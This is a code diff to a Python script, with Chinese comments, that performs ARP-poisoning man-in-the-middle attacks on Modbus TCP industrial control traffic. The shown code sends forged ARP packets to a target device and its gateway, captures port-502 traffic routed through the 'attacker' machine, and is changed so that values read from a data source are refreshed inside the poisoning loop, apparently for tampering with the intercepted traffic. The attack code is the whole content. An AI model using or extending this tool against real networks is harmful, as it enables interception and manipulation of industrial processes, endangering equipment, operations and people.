@@ -507,24 +507,6 @@ def main():
     print(f"[INFO] 网关 IP: {gateway_ip} ({gateway_mac})")
     print(f"[INFO] 攻击者 MAC: {attacker_mac}")
 
-    try:
-        while True:
-            # 从数据源读取数据
-            xb1, xb2, xb3, xloag = read_data()
-
-            # 更新全局变量
-            b1 = xb1
-            b2 = xb2
-            b3 = xb3
-            loag = xloag
-            # 打印读取的值
-            #print(f"[INFO] 读取到数据: b1={b1}, b2={b2}, b3={b3}, loag={loag}")
-
-            # 等待3秒
-            time.sleep(3)
-
-    except KeyboardInterrupt:
-        print("[INFO] 程序已退出")
     # 启动一个线程捕获目标设备和网关之间的 Modbus TCP 流量
     filter = f"ether dst {attacker_mac} and tcp port 502"
     capture_thread = threading.Thread(
@@ -541,6 +523,13 @@ def main():
             # 持续发送伪造的 ARP 包
             send_arp_poison(target_ip, target_mac, gateway_ip, attacker_mac, iface)
             send_arp_poison(gateway_ip, gateway_mac, target_ip, attacker_mac, iface)
+            xb1, xb2, xb3, xloag = read_data()
+
+            # 更新全局变量
+            b1 = xb1
+            b2 = xb2
+            b3 = xb3
+            loag = xloag
             # 检查目标设备的 ARP 表是否已经修改
             observed_mac = getmacbyip(target_ip)
             if observed_mac != gateway_mac:
